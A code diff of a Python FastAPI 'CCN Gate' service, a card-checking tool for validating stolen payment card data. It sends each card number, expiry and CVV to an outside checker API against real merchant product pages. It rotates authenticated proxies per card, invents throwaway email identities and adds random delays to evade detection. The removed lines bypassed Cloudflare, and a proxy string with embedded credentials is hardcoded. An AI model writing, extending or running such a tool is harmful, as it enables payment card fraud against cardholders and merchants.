@@ -5,12 +5,11 @@ import random
 import asyncio
 from typing import List, Optional
 
-from fastapi import FastAPI
+from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
-import cloudscraper
+import httpx
 from fake_useragent import UserAgent
-import traceback
 
 # ---------------------------
 # FastAPI App
@@ -41,6 +40,10 @@ class CCResponse(BaseModel):
 # ---------------------------
 # Helpers
 # ---------------------------
+def load_proxies(path="proxies.txt"):
+    with open(path, "r") as f:
+        return [line.strip() for line in f if line.strip()]
+
 def generate_nonce(length=10):
     chars = string.hexdigits.lower()
     return ''.join(random.choice(chars) for _ in range(length))
@@ -53,168 +56,48 @@ def gets(s, start, end):
     except ValueError:
         return None
 
-DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+users = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
 
-async def get_session():
+async def get_session(proxy_line: str):
     """
-    Create a cloudscraper session that bypasses Cloudflare.
-    Returns: cloudscraper.CloudScraper
+    Creates a new AsyncClient with proxy configured.
+    Returns: (session, proxy_url)
     """
-    try:
-        ua = UserAgent().random
-    except Exception:
-        ua = DEFAULT_UA
+    host, port, user, pwd = proxy_line.split(":")
+    if "session-RANDOMID" in user:
+        user = user.replace("session-RANDOMID", f"session-{uuid.uuid4().hex}")
+    proxy_url = f"http://{user}:{pwd}@{host}:{port}"
     
-    scraper = cloudscraper.create_scraper(
-        browser={
-            'browser': 'chrome',
-            'platform': 'windows',
-            'mobile': False
-        },
-        delay=15,
-        captcha={
-            'provider': '2captcha',
-            'api_key': 'your_2captcha_key'
-        } if False else None  # Disable captcha solving for now
+    session = httpx.AsyncClient(
+        proxies={"http://": proxy_url, "https://": proxy_url},
+        timeout=httpx.Timeout(60.0),
+        trust_env=False,
+        follow_redirects=True
     )
-    
-    # More comprehensive headers to mimic real browser
-    scraper.headers.update({
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept-language": "en-US,en;q=0.9",
-        "accept-encoding": "gzip, deflate, br",
-        "user-agent": ua,
-        "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-        "sec-ch-ua-mobile": "?0",
-        "sec-ch-ua-platform": '"Windows"',
-        "sec-fetch-dest": "document",
-        "sec-fetch-mode": "navigate",
-        "sec-fetch-site": "none",
-        "sec-fetch-user": "?1",
-        "upgrade-insecure-requests": "1",
-        "cache-control": "max-age=0",
-    })
-    return scraper
+    return session, proxy_url
 
 # ---------------------------
-# Core Payment Function
+# Core Payment Function (Updated with new site data)
 # ---------------------------
-async def create_payment_method(fullz: str, session):
-    """
-    Always returns a CCResponse object.
-    Uses cloudscraper to bypass Cloudflare protection.
-    """
-    proxy_used = None
+async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_url: str):
     try:
         cc, mes, ano, cvv = fullz.split("|")
         user = "cristniki" + str(random.randint(9999, 574545))
         mail = f"{user}@gmail.com"
 
-        url = (
-            f'https://ayanochk.vip/api/ppcpgatewayccn.php'
-            f'?lista={fullz}'
-            f'&sites=https://mandarli.com/product/999-mogoke-mee-shay'
-            f'&xlite=undefined'
+        headers = {
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "accept-language": "en-US,en;q=0.9",
+            "user-agent": users,
+        }
+
+        final = await session.get(
+            f'https://ayanochk.vip/api/ppcpgatewayccn.php?lista={fullz}&proxy=178.128.69.159:31114:oc-045bd5bf215c66a611bed69974d9892d1715b3242d6ae48965c9989272c520c9:qrewlq6ifcv4&sites=https://tinyfragrances.co.uk/product/courreges-c/&xlite=undefined',
+            headers=headers,
         )
 
-        # Use cloudscraper to bypass CF with retries
-        loop = asyncio.get_event_loop()
-        
-        def make_request():
-            import gzip
-            import zlib
-            import brotli
-            
-            max_retries = 3
-            for attempt in range(max_retries):
-                try:
-                    # Ensure we accept and decode gzip/deflate/br
-                    response = session.get(url, timeout=90, allow_redirects=True)
-                    
-                    # Get raw content
-                    raw_content = response.content
-                    
-                    # Try multiple decompression methods
-                    response_text = None
-                    
-                    # Method 1: Try response.text (automatic decoding)
-                    try:
-                        response_text = response.text
-                        print(f"✅ Decoded using response.text")
-                    except Exception as e:
-                        print(f"⚠️ response.text failed: {e}")
-                    
-                    # Method 2: Try gzip decompression
-                    if not response_text or len(response_text) < 10:
-                        try:
-                            response_text = gzip.decompress(raw_content).decode('utf-8')
-                            print(f"✅ Decoded using gzip")
-                        except Exception as e:
-                            print(f"⚠️ gzip failed: {e}")
-                    
-                    # Method 3: Try zlib/deflate decompression
-                    if not response_text or len(response_text) < 10:
-                        try:
-                            response_text = zlib.decompress(raw_content).decode('utf-8')
-                            print(f"✅ Decoded using zlib")
-                        except Exception as e:
-                            print(f"⚠️ zlib failed: {e}")
-                    
-                    # Method 4: Try zlib with -zlib.MAX_WBITS (raw deflate)
-                    if not response_text or len(response_text) < 10:
-                        try:
-                            response_text = zlib.decompress(raw_content, -zlib.MAX_WBITS).decode('utf-8')
-                            print(f"✅ Decoded using raw deflate")
-                        except Exception as e:
-                            print(f"⚠️ raw deflate failed: {e}")
-                    
-                    # Method 5: Try brotli decompression
-                    if not response_text or len(response_text) < 10:
-                        try:
-                            response_text = brotli.decompress(raw_content).decode('utf-8')
-                            print(f"✅ Decoded using brotli")
-                        except Exception as e:
-                            print(f"⚠️ brotli failed: {e}")
-                    
-                    # Method 6: Fallback to raw decode with error handling
-                    if not response_text or len(response_text) < 10:
-                        try:
-                            response_text = raw_content.decode('utf-8', errors='ignore')
-                            print(f"⚠️ Using raw decode with errors ignored")
-                        except Exception as e:
-                            print(f"⚠️ raw decode failed: {e}")
-                            response_text = str(raw_content)
-                    
-                    # Check if we got a Cloudflare challenge
-                    if response_text and 'cloudflare' in response_text.lower() and 'just a moment' in response_text.lower():
-                        if attempt < max_retries - 1:
-                            print(f"⚠️ Cloudflare challenge detected, retry {attempt + 1}/{max_retries}")
-                            import time
-                            time.sleep(5 * (attempt + 1))  # Exponential backoff
-                            continue
-                    
-                    # Store decoded text in response object for later use
-                    response._decoded_text = response_text
-                    return response
-                except Exception as e:
-                    if attempt < max_retries - 1:
-                        print(f"⚠️ Request failed, retry {attempt + 1}/{max_retries}: {str(e)}")
-                        import time
-                        time.sleep(3)
-                        continue
-                    raise
-            return response
-        
-        final = await loop.run_in_executor(None, make_request)
+        response_text = final.text
 
-        # Use the decoded text from make_request
-        response_text = final._decoded_text if hasattr(final, '_decoded_text') else final.text
-
-        # debug log
-        print("🔹 API Raw Response (truncated 800 chars):")
-        print(response_text[:800])
-
-        # interpret response
         if "DECLINED" in response_text:
             status, message = "declined", "Card Declined"
         elif "CCN CHARGED" in response_text:
@@ -222,71 +105,74 @@ async def create_payment_method(fullz: str, session):
         elif "LIVE CCN" in response_text:
             status, message = "live", "Invalid CVV → CCN"
         else:
-            status, message = "error", f"Unexpected API Response: {response_text[:400]}"
+            status, message = "error", "API ISSUE"
 
         return CCResponse(
             card=fullz,
             status=status,
             message=message,
-            proxy_used=proxy_used,
+            proxy_used=proxy_url,
         )
 
     except Exception as e:
-        error_details = traceback.format_exc()
-        print("⚠️ Exception occurred while processing:", fullz)
-        print(error_details)
         return CCResponse(
             card=fullz,
             status="error",
-            message=error_details[:400],
-            proxy_used=proxy_used,
+            message=f"Exception: {str(e)}",
+            proxy_used=proxy_url,
         )
 
 # ---------------------------
-# API ENDPOINTS
+# API ENDPOINTS (Updated to use unique proxy per card)
 # ---------------------------
 @app.get("/")
 async def root():
-    return {"message": "CCN Gate API with CF Bypass is running"}
+    return {"message": "CCN Gate API is running"}
 
 @app.get("/ccngate/{cards}", response_model=List[CCResponse])
 async def check_cards_get(cards: str):
     card_list = cards.split(",")[:5]
-
+    proxies = load_proxies()
+    
     results = []
     for i, card in enumerate(card_list):
-        if not card.strip():
-            continue
-
-        session = await get_session()
-        try:
-            res = await create_payment_method(card.strip(), session)
-            results.append(res)
-        finally:
-            pass
-
-        await asyncio.sleep(random.uniform(1.5, 3.5))
-
+        if card.strip():
+            # Use a different proxy for each card
+            proxy_line = proxies[i % len(proxies)]
+            session, proxy_url = await get_session(proxy_line)
+            
+            try:
+                res = await create_payment_method(card.strip(), session, proxy_url)
+                results.append(res)
+            finally:
+                await session.aclose()
+                
+            # Add small delay between cards
+            await asyncio.sleep(random.uniform(1.5, 3.5))
+    
     return results
 
 @app.post("/ccngate", response_model=List[CCResponse])
 async def check_cards_post(request: CCRequest):
     card_list = request.cards.split(",")[:5]
-
+    proxies = load_proxies()
+    
     results = []
     for i, card in enumerate(card_list):
-        if not card.strip():
-            continue
-
-        session = await get_session()
-        try:
-            res = await create_payment_method(card.strip(), session)
-            results.append(res)
-        finally:
-            pass
-
-        await asyncio.sleep(random.uniform(1.5, 3.5))
-
+        if card.strip():
+            # Use a different proxy for each card
+            proxy_line = proxies[i % len(proxies)]
+            session, proxy_url = await get_session(proxy_line)
+            
+            try:
+                res = await create_payment_method(card.strip(), session, proxy_url)
+                results.append(res)
+            finally:
+                await session.aclose()
+                
+            # Add small delay between cards
+            await asyncio.sleep(random.uniform(1.5, 3.5))
+    
     return results
 
 # ---------------------------
